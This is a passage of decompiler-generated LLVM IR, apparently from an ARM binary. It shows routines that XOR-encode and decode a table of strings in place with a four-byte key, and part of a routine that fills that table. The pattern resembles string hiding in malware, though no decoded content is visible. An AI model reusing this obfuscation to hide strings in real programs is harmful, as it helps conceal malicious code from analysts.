  %v3_112a8 = and i32 %v3_11294, 2040
  %v2_112ac = add i32 %v3_112a8, ptrtoint (i32* @global_var_1a44c.264 to i32)
  store i32 %v2_112ac, i32* %lr.global-to-local, align 4
  %v1_112b4 = add i32 %v3_112a8, add (i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32 4)
  store i32 %v1_112b4, i32* %r7.global-to-local, align 4
  %v2_112b8 = load i32, i32* @global_var_1a3a4.267, align 4
  %v2_112bc = inttoptr i32 %v1_112b4 to i8*
  %v3_112bc = load i8, i8* %v2_112bc, align 4
  %v4_112bc = zext i8 %v3_112bc to i32
  store i32 %v4_112bc, i32* @r1, align 4
  %v1_112c0 = add i32 %v3_112a8, add (i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32 5)
  %v2_112c0 = inttoptr i32 %v1_112c0 to i8*
  %v3_112c0 = load i8, i8* %v2_112c0, align 1
  %v4_112c0 = zext i8 %v3_112c0 to i32
  %v3_112c4 = udiv i32 %v2_112b8, 256
  %v4_112c8 = mul nuw nsw i32 %v4_112c0, 256
  %v5_112c8 = or i32 %v4_112c8, %v4_112bc
  %v7_112c8 = icmp eq i32 %v5_112c8, 0
  store i1 %v7_112c8, i1* @cpsr_z, align 1
  %v3_112cc = udiv i32 %v2_112b8, 65536
  %v1_112d0 = urem i32 %v3_112c4, 256
  store i32 %v1_112d0, i32* %r6.global-to-local, align 4
  %v1_112d4 = urem i32 %v3_112cc, 256
  store i32 %v1_112d4, i32* %r5.global-to-local, align 4
  %v3_112d8 = udiv i32 %v2_112b8, 16777216
  store i32 %v3_112d8, i32* %r4.global-to-local, align 4
  %v1_112dc = urem i32 %v2_112b8, 256
  br i1 %v7_112c8, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_11294
  store i32 %v3_11298, i32* @r4, align 4
  ret i32 %v1_112dc

bb8:                                              ; preds = %dec_label_pc_11294
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_112e8

dec_label_pc_112e8:                               ; preds = %dec_label_pc_112e8, %bb8
  %v2_112f4 = phi i32 [ %v1_11330, %dec_label_pc_112e8 ], [ 0, %bb8 ]
  %v0_112e8 = phi i32 [ %v0_11328, %dec_label_pc_112e8 ], [ %v2_112ac, %bb8 ]
  %v1_112e8 = inttoptr i32 %v0_112e8 to i32*
  %v2_112e8 = load i32, i32* %v1_112e8, align 4
  %v2_112ec = add i32 %v2_112e8, %v2_112f4
  %v3_112ec = inttoptr i32 %v2_112ec to i8*
  %v4_112ec = load i8, i8* %v3_112ec, align 1
  %v6_112ec = zext i8 %v4_112ec to i32
  %v2_112f0 = xor i32 %v6_112ec, %v1_112dc
  %v1_112f4 = trunc i32 %v2_112f0 to i8
  store i8 %v1_112f4, i8* %v3_112ec, align 1
  %v0_112f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_112f8 = inttoptr i32 %v0_112f8 to i32*
  %v2_112f8 = load i32, i32* %v1_112f8, align 4
  %v0_112fc = load i32, i32* @ip, align 4
  %v2_112fc = add i32 %v0_112fc, %v2_112f8
  %v3_112fc = inttoptr i32 %v2_112fc to i8*
  %v4_112fc = load i8, i8* %v3_112fc, align 1
  %v6_112fc = zext i8 %v4_112fc to i32
  %v0_11300 = load i32, i32* %r6.global-to-local, align 4
  %v2_11300 = xor i32 %v0_11300, %v6_112fc
  %v1_11304 = trunc i32 %v2_11300 to i8
  store i8 %v1_11304, i8* %v3_112fc, align 1
  %v0_11308 = load i32, i32* %lr.global-to-local, align 4
  %v1_11308 = inttoptr i32 %v0_11308 to i32*
  %v2_11308 = load i32, i32* %v1_11308, align 4
  %v0_1130c = load i32, i32* @ip, align 4
  %v2_1130c = add i32 %v0_1130c, %v2_11308
  %v3_1130c = inttoptr i32 %v2_1130c to i8*
  %v4_1130c = load i8, i8* %v3_1130c, align 1
  %v6_1130c = zext i8 %v4_1130c to i32
  %v0_11310 = load i32, i32* %r5.global-to-local, align 4
  %v2_11310 = xor i32 %v0_11310, %v6_1130c
  %v1_11314 = trunc i32 %v2_11310 to i8
  store i8 %v1_11314, i8* %v3_1130c, align 1
  %v0_11318 = load i32, i32* %lr.global-to-local, align 4
  %v1_11318 = inttoptr i32 %v0_11318 to i32*
  %v2_11318 = load i32, i32* %v1_11318, align 4
  store i32 %v2_11318, i32* @r1, align 4
  %v0_1131c = load i32, i32* @ip, align 4
  %v2_1131c = add i32 %v0_1131c, %v2_11318
  %v3_1131c = inttoptr i32 %v2_1131c to i8*
  %v4_1131c = load i8, i8* %v3_1131c, align 1
  %v6_1131c = zext i8 %v4_1131c to i32
  %v0_11320 = load i32, i32* %r4.global-to-local, align 4
  %v2_11320 = xor i32 %v0_11320, %v6_1131c
  %v1_11324 = trunc i32 %v2_11320 to i8
  store i8 %v1_11324, i8* %v3_1131c, align 1
  %v0_11328 = load i32, i32* %lr.global-to-local, align 4
  %v1_11328 = add i32 %v0_11328, 4
  %v2_11328 = inttoptr i32 %v1_11328 to i8*
  %v3_11328 = load i8, i8* %v2_11328, align 1
  %v4_11328 = zext i8 %v3_11328 to i32
  %v0_1132c = load i32, i32* %r7.global-to-local, align 4
  %v1_1132c = add i32 %v0_1132c, 1
  %v2_1132c = inttoptr i32 %v1_1132c to i8*
  %v3_1132c = load i8, i8* %v2_1132c, align 1
  %v4_1132c = zext i8 %v3_1132c to i32
  %v0_11330 = load i32, i32* @ip, align 4
  %v1_11330 = add i32 %v0_11330, 1
  store i32 %v1_11330, i32* @ip, align 4
  %v4_11334 = mul nuw nsw i32 %v4_1132c, 256
  %v5_11334 = or i32 %v4_11334, %v4_11328
  %v9_11338 = icmp eq i32 %v5_11334, %v1_11330
  store i1 %v9_11338, i1* @cpsr_z, align 1
  %v8_1133c = icmp sgt i32 %v5_11334, %v1_11330
  br i1 %v8_1133c, label %dec_label_pc_112e8, label %dec_label_pc_11340

dec_label_pc_11340:                               ; preds = %dec_label_pc_112e8
  %v2_11340 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11340, i32* @r4, align 4
  ret i32 %v1_112dc

; uselistorder directives
  uselistorder i32 %v1_11330, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11328, { 1, 0 }
  uselistorder i32 %v1_112dc, { 1, 2, 0 }
  uselistorder i32 %v2_112b8, { 3, 0, 1, 2 }
}

define i32 @function_1134c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1134c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1134c = mul i32 %arg1, 8
  %v3_11350 = load i32, i32* @r4, align 4
  store i32 %v3_11350, i32* %stack_var_-20, align 4
  %v3_11360 = and i32 %v3_1134c, 2040
  %v2_11364 = add i32 %v3_11360, ptrtoint (i32* @global_var_1a44c.264 to i32)
  store i32 %v2_11364, i32* %lr.global-to-local, align 4
  %v1_1136c = add i32 %v3_11360, add (i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32 4)
  store i32 %v1_1136c, i32* %r7.global-to-local, align 4
  %v2_11370 = load i32, i32* @global_var_1a3a4.267, align 4
  %v2_11374 = inttoptr i32 %v1_1136c to i8*
  %v3_11374 = load i8, i8* %v2_11374, align 4
  %v4_11374 = zext i8 %v3_11374 to i32
  %v1_11378 = add i32 %v3_11360, add (i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32 5)
  %v2_11378 = inttoptr i32 %v1_11378 to i8*
  %v3_11378 = load i8, i8* %v2_11378, align 1
  %v4_11378 = zext i8 %v3_11378 to i32
  %v3_1137c = udiv i32 %v2_11370, 256
  %v4_11380 = mul nuw nsw i32 %v4_11378, 256
  %v5_11380 = or i32 %v4_11380, %v4_11374
  %v7_11380 = icmp eq i32 %v5_11380, 0
  %v3_11384 = udiv i32 %v2_11370, 65536
  %v1_11388 = urem i32 %v3_1137c, 256
  store i32 %v1_11388, i32* %r6.global-to-local, align 4
  %v1_1138c = urem i32 %v3_11384, 256
  store i32 %v1_1138c, i32* %r5.global-to-local, align 4
  %v3_11390 = udiv i32 %v2_11370, 16777216
  store i32 %v3_11390, i32* %r4.global-to-local, align 4
  %v1_11394 = urem i32 %v2_11370, 256
  br i1 %v7_11380, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_1134c
  store i32 %v3_11350, i32* @r4, align 4
  ret i32 %v1_11394

bb8:                                              ; preds = %dec_label_pc_1134c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_113a0

dec_label_pc_113a0:                               ; preds = %dec_label_pc_113a0, %bb8
  %v2_113ac = phi i32 [ %v1_113e8, %dec_label_pc_113a0 ], [ 0, %bb8 ]
  %v0_113a0 = phi i32 [ %v0_113e0, %dec_label_pc_113a0 ], [ %v2_11364, %bb8 ]
  %v1_113a0 = inttoptr i32 %v0_113a0 to i32*
  %v2_113a0 = load i32, i32* %v1_113a0, align 4
  %v2_113a4 = add i32 %v2_113a0, %v2_113ac
  %v3_113a4 = inttoptr i32 %v2_113a4 to i8*
  %v4_113a4 = load i8, i8* %v3_113a4, align 1
  %v6_113a4 = zext i8 %v4_113a4 to i32
  %v2_113a8 = xor i32 %v6_113a4, %v1_11394
  %v1_113ac = trunc i32 %v2_113a8 to i8
  store i8 %v1_113ac, i8* %v3_113a4, align 1
  %v0_113b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_113b0 = inttoptr i32 %v0_113b0 to i32*
  %v2_113b0 = load i32, i32* %v1_113b0, align 4
  %v0_113b4 = load i32, i32* %ip.global-to-local, align 4
  %v2_113b4 = add i32 %v0_113b4, %v2_113b0
  %v3_113b4 = inttoptr i32 %v2_113b4 to i8*
  %v4_113b4 = load i8, i8* %v3_113b4, align 1
  %v6_113b4 = zext i8 %v4_113b4 to i32
  %v0_113b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_113b8 = xor i32 %v0_113b8, %v6_113b4
  %v1_113bc = trunc i32 %v2_113b8 to i8
  store i8 %v1_113bc, i8* %v3_113b4, align 1
  %v0_113c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_113c0 = inttoptr i32 %v0_113c0 to i32*
  %v2_113c0 = load i32, i32* %v1_113c0, align 4
  %v0_113c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_113c4 = add i32 %v0_113c4, %v2_113c0
  %v3_113c4 = inttoptr i32 %v2_113c4 to i8*
  %v4_113c4 = load i8, i8* %v3_113c4, align 1
  %v6_113c4 = zext i8 %v4_113c4 to i32
  %v0_113c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_113c8 = xor i32 %v0_113c8, %v6_113c4
  %v1_113cc = trunc i32 %v2_113c8 to i8
  store i8 %v1_113cc, i8* %v3_113c4, align 1
  %v0_113d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_113d0 = inttoptr i32 %v0_113d0 to i32*
  %v2_113d0 = load i32, i32* %v1_113d0, align 4
  %v0_113d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_113d4 = add i32 %v0_113d4, %v2_113d0
  %v3_113d4 = inttoptr i32 %v2_113d4 to i8*
  %v4_113d4 = load i8, i8* %v3_113d4, align 1
  %v6_113d4 = zext i8 %v4_113d4 to i32
  %v0_113d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_113d8 = xor i32 %v0_113d8, %v6_113d4
  %v1_113dc = trunc i32 %v2_113d8 to i8
  store i8 %v1_113dc, i8* %v3_113d4, align 1
  %v0_113e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_113e0 = add i32 %v0_113e0, 4
  %v2_113e0 = inttoptr i32 %v1_113e0 to i8*
  %v3_113e0 = load i8, i8* %v2_113e0, align 1
  %v4_113e0 = zext i8 %v3_113e0 to i32
  %v0_113e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_113e4 = add i32 %v0_113e4, 1
  %v2_113e4 = inttoptr i32 %v1_113e4 to i8*
  %v3_113e4 = load i8, i8* %v2_113e4, align 1
  %v4_113e4 = zext i8 %v3_113e4 to i32
  %v0_113e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_113e8 = add i32 %v0_113e8, 1
  store i32 %v1_113e8, i32* %ip.global-to-local, align 4
  %v4_113ec = mul nuw nsw i32 %v4_113e4, 256
  %v5_113ec = or i32 %v4_113ec, %v4_113e0
  %v8_113f4 = icmp sgt i32 %v5_113ec, %v1_113e8
  br i1 %v8_113f4, label %dec_label_pc_113a0, label %dec_label_pc_113f8

dec_label_pc_113f8:                               ; preds = %dec_label_pc_113a0
  %v2_113f8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_113f8, i32* @r4, align 4
  ret i32 %v1_11394

; uselistorder directives
  uselistorder i32 %v1_113e8, { 1, 2, 0 }
  uselistorder i32 %v0_113e0, { 1, 0 }
  uselistorder i32 %v1_11394, { 0, 2, 1 }
  uselistorder i32 %v2_11370, { 3, 0, 1, 2 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 9, 6, 8, 7, 10, 12, 11, 14, 13, 16, 15, 17, 18, 19, 20, 23, 21, 24, 22, 25, 26, 28, 27, 34, 29, 35, 30, 36, 31, 37, 32, 38, 33, 39, 42, 40, 41, 43, 44, 49, 45, 50, 46, 51, 47, 48, 52, 55, 53, 54, 56, 57, 62, 58, 63, 59, 64, 60, 61, 65, 73, 66, 74, 67, 75, 68, 76, 77, 69, 78, 70, 79, 71, 80, 72, 84, 81, 85, 82, 86, 83, 87, 94, 88, 95, 96, 89, 97, 92, 98, 90, 99, 100, 91, 93, 101, 102, 106, 103, 107, 108, 104, 105, 109, 110, 111, 114, 112, 115, 113, 116, 117, 118, 123, 119, 124, 120, 125, 121, 126, 122, 127, 128, 129, 130, 131, 132, 134, 133, 135 }
}

define i32 @function_11404(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11404:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11404 = load i32, i32* @r4, align 4
  store i32 %v3_11404, i32* %stack_var_-36, align 4
  %v1_1140c = call i32* @malloc(i32 2)
  %v2_1140c = ptrtoint i32* %v1_1140c to i32
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a44c.264 to i32), i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_1140c, i32* %r7.global-to-local, align 4
  %v4_11428 = call i32 @function_11814(i32 %v2_1140c, i32 ptrtoint ([3 x i8]* @global_var_120e0.272 to i32), i32 2)
  %v0_1142c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_1140c, i32* @global_var_1a454.273, align 4
  %v1_11434 = trunc i32 %v0_1142c to i8
  store i8 %v1_11434, i8* bitcast (i32* @global_var_1a458.274 to i8*), align 4
  %v0_11438 = load i32, i32* %r6.global-to-local, align 4
  %v1_11438 = trunc i32 %v0_11438 to i8
  store i8 %v1_11438, i8* bitcast (i32* @global_var_1a459.275 to i8*), align 4
  %v1_1143c = call i32* @malloc(i32 %v0_1142c)
  %v3_1143c = ptrtoint i32* %v1_1143c to i32
  %v0_11440 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_1143c, i32* %r7.global-to-local, align 4
  %v3_1144c = call i32 @function_11814(i32 %v3_1143c, i32 ptrtoint (i32* @global_var_120e4.277 to i32), i32 %v0_11440)
  store i32 %v3_1143c, i32* @global_var_1a45c.278, align 4
  %v0_11458 = load i32, i32* %r5.global-to-local, align 4
  %v1_11458 = trunc i32 %v0_11458 to i8
  store i8 %v1_11458, i8* bitcast (i32* @global_var_1a460.279 to i8*), align 4
  %v0_1145c = load i32, i32* %r6.global-to-local, align 4
  %v1_1145c = trunc i32 %v0_1145c to i8
  store i8 %v1_1145c, i8* bitcast (i32* @global_var_1a461.280 to i8*), align 4
  %v1_11460 = call i32* @malloc(i32 29)
  %v3_11460 = ptrtoint i32* %v1_11460 to i32
  store i32 %v3_11460, i32* %r5.global-to-local, align 4
  %v3_11470 = call i32 @function_11814(i32 %v3_11460, i32 ptrtoint (i32* @global_var_121c8.282 to i32), i32 29)
  store i8 29, i8* bitcast (i32* @global_var_1a468.283 to i8*), align 4
  %v0_11480 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11480, i32* @global_var_1a464.284, align 4
  %v0_11484 = load i32, i32* %r6.global-to-local, align 4
  %v1_11484 = trunc i32 %v0_11484 to i8
  store i8 %v1_11484, i8* bitcast (i32* @global_var_1a469.285 to i8*), align 4
  %v1_11488 = call i32* @malloc(i32 7)
  %v2_11488 = ptrtoint i32* %v1_11488 to i32
  store i32 %v2_11488, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r8.global-to-local, align 4
  %v4_1149c = call i32 @function_11814(i32 %v2_11488, i32 ptrtoint ([8 x i8]* @global_var_120e8.287 to i32), i32 7)
  %v0_114a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_114a4, i32* @global_var_1a4b4.288, align 4
  store i8 7, i8* bitcast (i32* @global_var_1a4b8.289 to i8*), align 4
  %v0_114ac = load i32, i32* %r6.global-to-local, align 4
  %v1_114ac = trunc i32 %v0_114ac to i8
  store i8 %v1_114ac, i8* bitcast (i32* @global_var_1a4b9.290 to i8*), align 4
  %v1_114b0 = call i32* @malloc(i32 5)
  %v2_114b0 = ptrtoint i32* %v1_114b0 to i32
  store i32 %v2_114b0, i32* %r5.global-to-local, align 4
  store i32 5, i32* %fp.global-to-local, align 4
  %v4_114c4 = call i32 @function_11814(i32 %v2_114b0, i32 ptrtoint ([6 x i8]* @global_var_120f0.292 to i32), i32 5)
  %v0_114cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_114cc, i32* @global_var_1a4bc.293, align 4
  store i8 5, i8* bitcast (i32* @global_var_1a4c0.294 to i8*), align 4
  %v0_114d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_114d4 = trunc i32 %v0_114d4 to i8
  store i8 %v1_114d4, i8* bitcast (i32* @global_var_1a4c1.295 to i8*), align 4
  %v1_114d8 = call i32* @malloc(i32 4)
  %v3_114d8 = ptrtoint i32* %v1_114d8 to i32
  store i32 %v3_114d8, i32* %r5.global-to-local, align 4
  %v4_114e8 = call i32 @function_11814(i32 %v3_114d8, i32 ptrtoint ([5 x i8]* @global_var_120f8.297 to i32), i32 4)
  store i8 4, i8* bitcast (i32* @global_var_1a4c8.298 to i8*), align 4
  %v0_114f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_114f8, i32* @global_var_1a4c4.299, align 4
  %v0_114fc = load i32, i32* %r6.global-to-local, align 4
  %v1_114fc = trunc i32 %v0_114fc to i8
  store i8 %v1_114fc, i8* bitcast (i32* @global_var_1a4c9.300 to i8*), align 4
  %v1_11500 = call i32* @malloc(i32 6)
  %v2_11500 = ptrtoint i32* %v1_11500 to i32
  store i32 %v2_11500, i32* %r5.global-to-local, align 4
  store i32 6, i32* %sb.global-to-local, align 4
  %v4_11514 = call i32 @function_11814(i32 %v2_11500, i32 ptrtoint ([7 x i8]* @global_var_12100.302 to i32), i32 6)
  %v0_1151c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1151c, i32* @global_var_1a4cc.303, align 4
  store i8 6, i8* bitcast (i32* @global_var_1a4d0.304 to i8*), align 4
  %v0_11524 = load i32, i32* %r6.global-to-local, align 4
  %v1_11524 = trunc i32 %v0_11524 to i8
  store i8 %v1_11524, i8* bitcast (i32* @global_var_1a4d1.305 to i8*), align 4
  %v1_11528 = call i32* @malloc(i32 14)
  %v2_11528 = ptrtoint i32* %v1_11528 to i32
  store i32 %v2_11528, i32* %r5.global-to-local, align 4
  store i32 14, i32* %sl.global-to-local, align 4
  %v4_1153c = call i32 @function_11814(i32 %v2_11528, i32 ptrtoint ([15 x i8]* @global_var_12108.306 to i32), i32 14)
  %v0_11544 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11544, i32* @global_var_1a4d4.307, align 4
  store i8 14, i8* bitcast (i32* @global_var_1a4d8.308 to i8*), align 4
  %v0_1154c = load i32, i32* %r6.global-to-local, align 4
  %v1_1154c = trunc i32 %v0_1154c to i8
  store i8 %v1_1154c, i8* bitcast (i32* @global_var_1a4d9.309 to i8*), align 4
  %v1_11550 = call i32* @malloc(i32 8)
  %v2_11550 = ptrtoint i32* %v1_11550 to i32
  store i32 8, i32* %r7.global-to-local, align 4
  store i32 %v2_11550, i32* %r5.global-to-local, align 4
  %v4_11564 = call i32 @function_11814(i32 %v2_11550, i32 ptrtoint ([9 x i8]* @global_var_12118.311 to i32), i32 8)
  %v0_11568 = load i32, i32* %r8.global-to-local, align 4
  %v0_1156c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1156c, i32* @global_var_1a534.312, align 4
  store i8 8, i8* bitcast (i32* @global_var_1a538.313 to i8*), align 4
  %v0_11574 = load i32, i32* %r6.global-to-local, align 4
  %v1_11574 = trunc i32 %v0_11574 to i8
  store i8 %v1_11574, i8* bitcast (i32* @global_var_1a539.314 to i8*), align 4
  %v1_11578 = call i32* @malloc(i32 %v0_11568)
  %v3_11578 = ptrtoint i32* %v1_11578 to i32
  %v0_11580 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_11578, i32* %r5.global-to-local, align 4
  %v4_11588 = call i32 @function_11814(i32 %v3_11578, i32 ptrtoint ([8 x i8]* @global_var_12124.316 to i32), i32 %v0_11580)
  %v0_11590 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11590, i32* @global_var_1a53c.317, align 4
  %v1_11594 = trunc i32 %v0_11580 to i8
  store i8 %v1_11594, i8* bitcast (i32* @global_var_1a540.318 to i8*), align 4
  %v0_11598 = load i32, i32* %r6.global-to-local, align 4
  %v1_11598 = trunc i32 %v0_11598 to i8
  %v2_11598 = load i32, i32* %r4.global-to-local, align 4
  %v3_11598 = add i32 %v2_11598, 245
  %v4_11598 = inttoptr i32 %v3_11598 to i8*
  store i8 %v1_11598, i8* %v4_11598, align 1
  %v1_1159c = call i32* @malloc(i32 16)
  %v3_1159c = ptrtoint i32* %v1_1159c to i32
  store i32 %v3_1159c, i32* %r5.global-to-local, align 4
  %v4_115ac = call i32 @function_11814(i32 %v3_1159c, i32 ptrtoint ([17 x i8]* @global_var_1212c.320 to i32), i32 16)
  %v0_115b4 = load i32, i32* %r7.global-to-local, align 4
  store i8 16, i8* bitcast (i32* @global_var_1a4e0.321 to i8*), align 4
  %v0_115bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_115bc, i32* @global_var_1a4dc.322, align 4
  %v0_115c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_115c0 = trunc i32 %v0_115c0 to i8
  store i8 %v1_115c0, i8* bitcast (i32* @global_var_1a4e1.323 to i8*), align 4
  %v1_115c4 = call i32* @malloc(i32 %v0_115b4)
  %v3_115c4 = ptrtoint i32* %v1_115c4 to i32
  %v0_115cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_115c4, i32* %r5.global-to-local, align 4
  %v4_115d4 = call i32 @function_11814(i32 %v3_115c4, i32 ptrtoint ([9 x i8]* @global_var_12140.325 to i32), i32 %v0_115cc)
  %v0_115dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_115dc, i32* @global_var_1a4e4.326, align 4
  %v1_115e0 = trunc i32 %v0_115cc to i8
  store i8 %v1_115e0, i8* bitcast (i32* @global_var_1a4e8.327 to i8*), align 4
  %v0_115e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_115e4 = trunc i32 %v0_115e4 to i8
  store i8 %v1_115e4, i8* bitcast (i32* @global_var_1a4e9.328 to i8*), align 4
  %v1_115e8 = call i32* @malloc(i32 21)
  %v3_115e8 = ptrtoint i32* %v1_115e8 to i32
  store i32 %v3_115e8, i32* %r5.global-to-local, align 4
  %v3_115f8 = call i32 @function_11814(i32 %v3_115e8, i32 ptrtoint (i32* @global_var_121e8.330 to i32), i32 21)
  store i8 21, i8* bitcast (i32* @global_var_1a4f0.331 to i8*), align 4
  %v0_11608 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11608, i32* @global_var_1a4ec.332, align 4
  %v0_1160c = load i32, i32* %r6.global-to-local, align 4
  %v1_1160c = trunc i32 %v0_1160c to i8
  store i8 %v1_1160c, i8* bitcast (i32* @global_var_1a4f1.333 to i8*), align 4
  %v1_11610 = call i32* @malloc(i32 17)
  %v3_11610 = ptrtoint i32* %v1_11610 to i32
  store i32 %v3_11610, i32* %r5.global-to-local, align 4
  %v4_11620 = call i32 @function_11814(i32 %v3_11610, i32 ptrtoint ([18 x i8]* @global_var_1214c.335 to i32), i32 17)
  store i8 17, i8* bitcast (i32* @global_var_1a4f8.336 to i8*), align 4
  %v0_11630 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11630, i32* @global_var_1a4f4.337, align 4
  %v0_11634 = load i32, i32* %r6.global-to-local, align 4
  %v1_11634 = trunc i32 %v0_11634 to i8
  store i8 %v1_11634, i8* bitcast (i32* @global_var_1a4f9.338 to i8*), align 4
  %v1_11638 = call i32* @malloc(i32 12)
  %v3_11638 = ptrtoint i32* %v1_11638 to i32
  store i32 %v3_11638, i32* %r5.global-to-local, align 4
  %v4_11648 = call i32 @function_11814(i32 %v3_11638, i32 ptrtoint ([13 x i8]* @global_var_12160.340 to i32), i32 12)
  %v0_11650 = load i32, i32* %sl.global-to-local, align 4
  store i8 12, i8* bitcast (i32* @global_var_1a500.341 to i8*), align 4
  %v0_11658 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11658, i32* @global_var_1a4fc.342, align 4
  %v0_1165c = load i32, i32* %r6.global-to-local, align 4
  %v1_1165c = trunc i32 %v0_1165c to i8
  store i8 %v1_1165c, i8* bitcast (i32* @global_var_1a501.343 to i8*), align 4
  %v1_11660 = call i32* @malloc(i32 %v0_11650)
  %v3_11660 = ptrtoint i32* %v1_11660 to i32
  %v0_11668 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v3_11660, i32* %r5.global-to-local, align 4
  %v4_11670 = call i32 @function_11814(i32 %v3_11660, i32 ptrtoint ([15 x i8]* @global_var_12170.345 to i32), i32 %v0_11668)
  %v0_11678 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11678, i32* @global_var_1a504.346, align 4
  %v1_1167c = trunc i32 %v0_11668 to i8
  store i8 %v1_1167c, i8* bitcast (i32* @global_var_1a508.347 to i8*), align 4
  %v0_11680 = load i32, i32* %r6.global-to-local, align 4
  %v1_11680 = trunc i32 %v0_11680 to i8
  store i8 %v1_11680, i8* bitcast (i32* @global_var_1a509.348 to i8*), align 4
  %v1_11684 = call i32* @malloc(i32 19)
  %v3_11684 = ptrtoint i32* %v1_11684 to i32
  store i32 %v3_11684, i32* %r5.global-to-local, align 4
  %v4_11694 = call i32 @function_11814(i32 %v3_11684, i32 ptrtoint ([20 x i8]* @global_var_12180.350 to i32), i32 19)
  %v0_1169c = load i32, i32* %r7.global-to-local, align 4
  store i8 19, i8* bitcast (i32* @global_var_1a510.351 to i8*), align 4
  %v0_116a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116a4, i32* @global_var_1a50c.352, align 4
  %v0_116a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_116a8 = trunc i32 %v0_116a8 to i8
  store i8 %v1_116a8, i8* bitcast (i32* @global_var_1a511.353 to i8*), align 4
  %v1_116ac = call i32* @malloc(i32 %v0_1169c)
  %v3_116ac = ptrtoint i32* %v1_116ac to i32
  %v0_116b4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_116ac, i32* %r5.global-to-local, align 4
  %v4_116bc = call i32 @function_11814(i32 %v3_116ac, i32 ptrtoint ([9 x i8]* @global_var_12194.355 to i32), i32 %v0_116b4)
  %v0_116c0 = load i32, i32* %fp.global-to-local, align 4
  %v0_116c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116c4, i32* @global_var_1a514.356, align 4
  %v1_116c8 = trunc i32 %v0_116b4 to i8
  store i8 %v1_116c8, i8* bitcast (i32* @global_var_1a518.357 to i8*), align 4
  %v0_116cc = load i32, i32* %r6.global-to-local, align 4
  %v1_116cc = trunc i32 %v0_116cc to i8
  store i8 %v1_116cc, i8* bitcast (i32* @global_var_1a519.358 to i8*), align 4
  %v1_116d0 = call i32* @malloc(i32 %v0_116c0)
  %v3_116d0 = ptrtoint i32* %v1_116d0 to i32
  %v0_116d8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_116d0, i32* %r5.global-to-local, align 4
  %v4_116e0 = call i32 @function_11814(i32 %v3_116d0, i32 ptrtoint ([6 x i8]* @global_var_121a0.360 to i32), i32 %v0_116d8)
  %v0_116e4 = load i32, i32* %sb.global-to-local, align 4
  %v0_116e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116e8, i32* @global_var_1a51c.361, align 4
  %v1_116ec = trunc i32 %v0_116d8 to i8
  store i8 %v1_116ec, i8* bitcast (i32* @global_var_1a520.362 to i8*), align 4
  %v0_116f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_116f0 = trunc i32 %v0_116f0 to i8
  store i8 %v1_116f0, i8* bitcast (i32* @global_var_1a521.363 to i8*), align 4
  %v1_116f4 = call i32* @malloc(i32 %v0_116e4)
  %v3_116f4 = ptrtoint i32* %v1_116f4 to i32
